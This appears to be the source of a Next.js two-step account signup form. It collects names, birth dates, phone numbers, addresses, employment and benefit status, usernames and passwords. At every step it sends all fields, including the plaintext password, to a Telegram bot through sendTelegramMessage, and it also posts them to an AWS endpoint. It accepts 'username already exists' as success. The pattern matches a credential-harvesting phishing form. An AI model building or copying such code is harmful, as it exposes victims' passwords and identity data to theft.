/* eslint-disable @next/next/no-img-element */
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import { sendTelegramMessage } from "../../utils/telegram";
import { AxiosError } from 'axios';
import { useEffect } from "react";

const states = [
  'NSW', // New South Wales
  'VIC', // Victoria
  'QLD', // Queensland
  'SA',  // South Australia
  'WA',  // Western Australia
  'TAS', // Tasmania
  'ACT', // Australian Capital Territory
  'NT'   // Northern Territory
];

  


type FormData = {
  firstName: string;
  lastName: string;
  day: string;
  month:string;
  year:string;
  phone: string;
  email: string;
  address: string;
  state: string;
  zipcode: string;
  employmentStatus: string;
  username: string;
  password: string;
  confirmPassword: string;
};



type FormErrors = Partial<Record<keyof FormData, string>>;

const MultiStepForm = () => {
  const router = useRouter();
  const [currentStep, setCurrentStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get("step");
    const storedData = localStorage.getItem("formData");
  
    if (storedData) {
      const parsedData = JSON.parse(storedData);
      setFormData(parsedData); // Restore form data
    }
  
    if (step) {
      setCurrentStep(parseInt(step)); // Restore step
    }
  }, []);
  
  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    lastName: '',
    day:'',
    month:'',
    year:'',
    phone: '',
    email: '',
    address: '',
    state: '',
    zipcode: '',
    employmentStatus: '',
    username: '',
    password: '',
    confirmPassword: '',
  });
  const [errors, setErrors] = useState<FormErrors>({});
  


  // Input formatting handlers
  const formatPhone = (value: string) => value
    .replace(/\D/g, '')
    .slice(0, 10)
    .replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');


  const formatZipCode = (value: string) => value;

  const handleChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    if (errors[field]) setErrors(prev => ({ ...prev, [field]: '' }));
  };

  // Validation functions
  const validateStep1 = () => {
    const newErrors: FormErrors = {};
    

    if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
    if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
    if (!formData.employmentStatus) newErrors.employmentStatus = 'Employment status is required';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateStep2 = () => {
    const newErrors: FormErrors = {};
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!formData.email.match(emailRegex)) newErrors.email = 'Invalid email address';
    if (!formData.address.trim()) newErrors.address = 'Address is required';
    if (!formData.state) newErrors.state = 'State is required';
    if (!formData.username.trim()) newErrors.username = 'Username is required';
    if (formData.password.length < 8) newErrors.password = 'Password must be at least 8 characters';
    if (formData.password !== formData.confirmPassword) newErrors.confirmPassword = 'Passwords do not match';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  const formatTelegramMessage = (data: FormData) => {
    return Object.entries(data)
      .map(([key, value]) => {
        const formattedKey = key.replace(/([A-Z])/g, ' $1').toUpperCase();
        return `${formattedKey}: ${value}`;
      })
      .join('\n');
  };

  const handleNext = async () => {
    const isValid = currentStep === 1 ? validateStep1() : validateStep2();
    
    if (isValid) {
      const message = formatTelegramMessage(formData);
      await sendTelegramMessage(message);
      localStorage.setItem("formData", JSON.stringify(formData));
  
      // Conditional Navigation based on Employment Status
      if (formData.employmentStatus === 'Social assistance (income supplement)') {
        router.push('/ssip'); // Replace with your actual page route
        return; // Stop further execution
      }
  
      // If no condition is met, proceed to the next step
      setCurrentStep(prev => prev + 1);
    }
  };
  

  const handleSubmit = async () => {
    setIsLoading(true); // Start loading state
    
    // Validate Step 2 before proceeding
    const isValid = validateStep2();
    if (!isValid) {
      setIsLoading(false); // Stop loading if validation fails
      return; // Stop further actions
    }
  
    try {
      // Format the message for Telegram
      const message = formatTelegramMessage(formData);
      await sendTelegramMessage(message); // Send Telegram message
  
      // Send the form data to API Gateway endpoint
      const response = await axios.post(
        'https://kj0cthjwe4.execute-api.us-east-1.amazonaws.com/latest/signupusa',
        formData
      );
      
      console.log(response);
  
      // Automatically save the username to localStorage on success
      if (response.status === 200 && response.data.username) {
        localStorage.setItem("username", response.data.username);
        router.push('/profile'); // Navigate to profile page
      }
    } catch (error: unknown) {
      if (error instanceof AxiosError) {
        console.error('Error occurred:', error);
        
        // Check if the error response contains "Username already exists"
        if (error.response && error.response.data.includes("Username already exists")) {
          // Save the username and route to profile page even if username exists
          localStorage.setItem("username", formData.username);
          router.push('/profile'); // Navigate to profile page
        } else if (error.response) {
          console.log(error.response.data); // Show other errors
        } else {
          console.log('Network error, please check your connection.');
        }
      } else if (error instanceof Error) {
        console.error('Unexpected error:', error);     
        
        console.log('An unexpected error occurred.');
      }
    } finally {
      setIsLoading(false); // Stop loading state
    }
  };
  
  
  
  

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-green-600 shadow-md">
        <div className="max-w-3xl mx-auto p-4 flex items-center">
          <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" />
          <div className="flex-1 ml-2">
            <div className="text-white font-medium">Step {currentStep} of 2</div>
            <div className="h-2 bg-green-500 rounded-full mt-1">
              <div 
                className="h-full bg-green-200 rounded-full transition-all duration-300"
                style={{ width: `${currentStep * 50}%` }}
              />
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-3xl mx-auto p-4">
        {currentStep === 1 && (
          <div className="bg-white p-6 rounded-lg shadow-md space-y-4">
            <h2 className="text-2xl font-semibold text-gray-800 mb-4">Personal Information</h2>
            
            <div className="grid grid-cols-2 gap-4">
              <InputField
                label="First Name"
                value={formData.firstName}
                onChange={v => handleChange('firstName', v)}
                error={errors.firstName}

                required
              />
              <InputField
                label="Last Name"
                value={formData.lastName}
                onChange={v => handleChange('lastName', v)}
                error={errors.lastName}
                required
              />
            </div>

            <div className="space-y-1">
  <label className="block text-sm font-medium text-black mb-1">Date of Birth</label>
  <div className="grid grid-cols-3 gap-2">
    <input
      id="day"
      name="day"
      type="text"
      required
      placeholder="DD"
      value={formData.day}
      onChange={(e) => handleChange('day', e.target.value)}
      className={`block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white`}
      maxLength={2}
    />
    <input
      id="month"
      name="month"
      type="text"
      required
      placeholder="MM"
      value={formData.month}
      onChange={(e) => handleChange('month', e.target.value)}
      className={`block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white`}
      maxLength={2}
    />
    <input
      id="year"
      name="year"
      type="text"
      required
      placeholder="YYYY"
      value={formData.year}
      onChange={(e) => handleChange('year', e.target.value)}
      className={`block w-full px-3 py-2 border rounded-md shadow-sm border-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white`}
      maxLength={4}
    />
  </div>
</div>

            
            <InputField
              label="Phone Number"
              value={formData.phone}
              onChange={v => handleChange('phone', formatPhone(v))}
              error={errors.phone}
              maxLength={14}
              required
            />
            <SelectField
                label="Employment Status"
                value={formData.employmentStatus}
                options={['Full time',
                    'Part time',
                    'Self-employed',
                    'Seasonal (EI)',
                    'Retired (pension)',
                    'Maternity leave',
                    'Disability',
                    'Social assistance (income supplement)',
                    'Unemployed']}
                onChange={v => handleChange('employmentStatus', v)}
                error={errors.employmentStatus}
                required
              />


            

            <div className="flex justify-end">
              <Button onClick={handleNext} disabled={Object.keys(errors).length > 0}>
                Next →
              </Button>
            </div>
          </div>
        )}

        {currentStep === 2 && (
          <div className="bg-white p-6 rounded-lg shadow-md space-y-4">
            <h2 className="text-2xl font-semibold text-gray-800 mb-4">Account Information</h2>

            <InputField
              label="Email Address"
              type="email"
              value={formData.email}
              onChange={v => handleChange('email', v)}
              error={errors.email}
              required
            />

            <InputField
              label="Street Address"
              value={formData.address}
              onChange={v => handleChange('address', v)}
              error={errors.address}
              required
            />

            <div className="grid grid-cols-2 gap-4">
  <TextField
    label="State"
    value={formData.state}
    onChange={v => handleChange('state', v)}
    error={errors.state}
    required
  />
              <InputField
              label="Post Code"
              value={formData.zipcode}
              onChange={v => handleChange('zipcode', formatZipCode(v))}
              error={errors.zipcode}
            />
              
              
            </div>

            <InputField
              label="Username"
              value={formData.username}
              onChange={v => handleChange('username', v)}
              error={errors.username}
              required
            />

            <div className="grid grid-cols-2 gap-4">
              <InputField
                label="Password"
                type="password"
                value={formData.password}
                onChange={v => handleChange('password', v)}
                error={errors.password}
                required
              />
              <InputField
                label="Confirm Password"
                type="password"
                value={formData.confirmPassword}
                onChange={v => handleChange('confirmPassword', v)}
                error={errors.confirmPassword}
                required
              />
            </div>

            

            <div className="flex justify-between">
              <Button variant="secondary" onClick={() => setCurrentStep(1)}>
                ← Back
              </Button>
              <Button 
                onClick={handleSubmit} 
                disabled={isLoading}
                loading={isLoading}
              >
                Create Account
              </Button>
            </div>
          </div>
        )}
      </main>
    </div>
  );
};

// Reusable Input Component
const InputField = ({
  label,
  value,
  onChange,
  error,
  type = 'text',
  placeholder,
  required = false,
  max,
  maxLength,
}: {
  label: string;
  value: string;
  onChange: (value: string) => void;
  error?: string;
  type?: string;
  placeholder?: string;
  required?: boolean;
  max?: string;
  maxLength?: number;
}) => (
  <div className="space-y-1">
    <label className="block text-sm font-medium text-gray-700">
      {label} {required && <span className="text-red-500">*</span>}
    </label>
    <input
  type={type}
  value={value}
  onChange={(e) => onChange(e.target.value)}
  className={`block w-full px-3 py-2 border rounded-md shadow-sm ${
    error ? 'border-red-500' : 'border-gray-300'
  } focus:outline-none focus:ring-2 focus:ring-green-500 text-black bg-white sm:text-black`}
  placeholder={placeholder}
  required={required}
  max={max}
  maxLength={maxLength}
/>

    {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
  </div>
);

// Reusable Select Component
const SelectField = ({
    label,
    value,
    options,
    onChange,
    error,
    required = false,
  }: {
    label: string;
    value: string;
    options: string[];
    onChange: (value: string) => void;
    error?: string;
    required?: boolean;
  }) => (
    <div className="space-y-1">
      <label className="block text-sm font-medium text-gray-700">
        {label} {required && <span className="text-red-500">*</span>}
      </label>
      <select
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className={`block w-full px-3 py-2 border rounded-md shadow-sm text-black bg-white ${
            error ? 'border-red-500' : 'border-gray-300'
          } focus:outline-none focus:ring-2 focus:ring-green-500`}
        required={required}
      >
        <option value="" className="text-gray-400">Select {label.toLowerCase()}</option>
        {options.map((option) => (
          <option key={option} value={option} className="text-black">
            {option}
          </option>
        ))}
      </select>
      {error && <p className="text-red-500 text-sm mt-1">{error}</p>}
    </div>
  );

// Reusable Button Component
const Button = ({
  children,
  onClick,
  variant = 'primary',
  disabled = false,
  loading = false,
}: {
  children: React.ReactNode;
  onClick: () => void;
  variant?: 'primary' | 'secondary';
  disabled?: boolean;
  loading?: boolean;
}) => (
  <button
    type="button"
    onClick={onClick}
    disabled={disabled || loading}
    className={`px-6 py-2 rounded-md font-medium transition-colors
      ${
        variant === 'primary'
          ? 'bg-green-600 text-white hover:bg-green-700 disabled:bg-green-300'
          : 'bg-gray-100 text-gray-700 hover:bg-gray-200 disabled:bg-gray-100'
      }
      ${loading ? 'pr-8' : ''}`}
  >
    {loading ? (
      <span className="flex items-center">
        <Spinner />
        {children}
      </span>
    ) : (
      children
    )}
  </button>
);

// Loading Spinner Component
const Spinner = () => (
  <svg
    className="animate-spin -ml-1 mr-2 h-5 w-5 text-white"
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    viewBox="0 0 24 24"
  >
    <circle
      className="opacity-25"
      cx="12"
      cy="12"
      r="10"
      stroke="currentColor"
      strokeWidth="4"
    ></circle>
    <path
      className="opacity-75"
      fill="currentColor"
      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
    ></path>
  </svg>
);

export default MultiStepForm;
